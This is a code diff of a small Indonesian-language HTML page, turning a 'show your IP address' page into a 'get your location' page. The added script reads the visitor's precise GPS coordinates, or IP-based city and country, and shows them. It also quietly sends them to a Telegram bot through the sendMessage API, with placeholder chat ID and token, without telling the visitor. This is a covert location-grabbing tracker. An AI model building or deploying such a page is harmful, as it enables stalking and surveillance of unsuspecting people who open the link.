@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dapatkan Alamat IP</title>
+    <title>Dapatkan Lokasi Anda</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -13,20 +13,73 @@
     </style>
 </head>
 <body>
-    <h1>Dapatkan Alamat IP Anda</h1>
-    <p id="ip-address">Sedang memuat alamat IP...</p>
+    <h1>Dapatkan Lokasi Anda</h1>
+    <p id="location">Sedang memuat lokasi...</p>
 
     <script>
-        // Mengambil alamat IP menggunakan API eksternal
-        fetch('https://api.ipify.org?format=json')
-            .then(response => response.json())
-            .then(data => {
-                document.getElementById('ip-address').innerHTML = "Alamat IP Anda: " + data.ip;
-            })
-            .catch(error => {
-                document.getElementById('ip-address').innerHTML = "Terjadi kesalahan saat mengambil alamat IP.";
-                console.error('Error:', error);
+        // Memeriksa apakah browser mendukung Geolocation
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const { latitude, longitude } = position.coords;
+                document.getElementById('location').innerHTML = `Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                // Kirim lokasi ke Telegram
+                const chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat ID Anda
+                const token = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Anda
+                const message = `Lokasi baru telah diakses: Latitude: ${latitude}, Longitude: ${longitude}`;
+
+                // Menggunakan Fetch API untuk mengirim pesan
+                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                    .then(response => {
+                        if (response.ok) {
+                            console.log("Pesan terkirim ke Telegram.");
+                        } else {
+                            console.error("Gagal mengirim pesan ke Telegram.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                    });
+            }, error => {
+                console.error('Error getting location:', error);
+                getLocationByIP(); // Jika gagal, ambil lokasi berdasarkan IP
             });
+        } else {
+            document.getElementById('location').innerHTML = "Geolocation tidak didukung oleh browser ini.";
+            getLocationByIP(); // Jika tidak didukung, ambil lokasi berdasarkan IP
+        }
+
+        // Fungsi untuk mengambil lokasi berdasarkan IP
+        function getLocationByIP() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    const { city, region, country } = data;
+                    document.getElementById('location').innerHTML = `Kota: ${city}, Wilayah: ${region}, Negara: ${country}`;
+
+                    // Kirim lokasi ke Telegram
+                    const chatId = 'YOUR_CHAT_ID'; // Ganti dengan chat ID Anda
+                    const token = 'YOUR_BOT_TOKEN'; // Ganti dengan token bot Anda
+                    const message = `Lokasi berdasarkan IP: Kota: ${city}, Wilayah: ${region}, Negara: ${country}`;
+
+                    // Menggunakan Fetch API untuk mengirim pesan
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+                        .then(response => {
+                            if (response.ok) {
+                                console.log("Pesan terkirim ke Telegram.");
+                            } else {
+                                console.error("Gagal mengirim pesan ke Telegram.");
+                            }
+                        })
+                        .catch(error => {
+                            console.error('Error:', error);
+                        });
+                })
+                .catch(error => {
+                    document.getElementById('location').innerHTML = "Terjadi kesalahan saat mengambil lokasi.";
+                    console.error('Error:', error);
+                });
+        }
     </script>
 </body>
 </html>
